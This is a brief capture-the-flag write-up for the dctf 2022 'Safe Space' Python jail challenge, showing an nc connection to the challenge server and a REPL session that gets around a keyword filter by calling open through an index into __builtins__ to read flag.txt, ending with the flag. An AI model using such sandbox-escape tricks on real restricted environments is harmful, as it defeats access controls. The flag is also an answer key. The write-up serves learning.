---
title: "dctf 2022 Safe Space writeup"
description: "dctf 2022 Python Jail Problem Safe Space writeup"
date: 2022-04-18T10:41:39+08:00
tags: [dctf, ctf-writeups]
---

## The problem

![](https://s2.loli.net/2022/04/18/Cys8U5m2RFGEON6.png)

[link to the problem(requires login)](https://dctf.dragonsec.si/challenges#Safe%20Space-18)

## Solution

First, connect to the remote server:

```shell
nc 51.124.222.205 13379
```

After interacting with the server, you'll find that the server is a python REPL with a lot of charcters and functions such as `"` unavaliable. 
This type of problem is called [python sandbox escape](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes), or python jail.

After trying all the commands from the internet, you'll find that the command `__builtins__` is not banned for this problem.
Inside the `__builtins__` dict, 
we have FILE set to `flag.txt`, and the open function, which is also unavaliable if entered directly.

Therefore, to read the contents of flag.txt, we can use the list of vlaues in __builtins__ dict, and access it by index.
Here's the entire process: 
```python
>>>__builtins__
{'open': <built-in function open>, 'print': <built-in function print>, 'list': <class 'list'>, 'FILE': 'flag.txt'}
>>>FILE
flag.txt
>>>open(FILE).read()
Yeah no.
>>>list(__builtins__.values())[0](FILE).read()
dctf{bur5t_y0ur_bubbl3}
```

Thus, the flag is `dctf{bur5t_y0ur_bubbl3}`
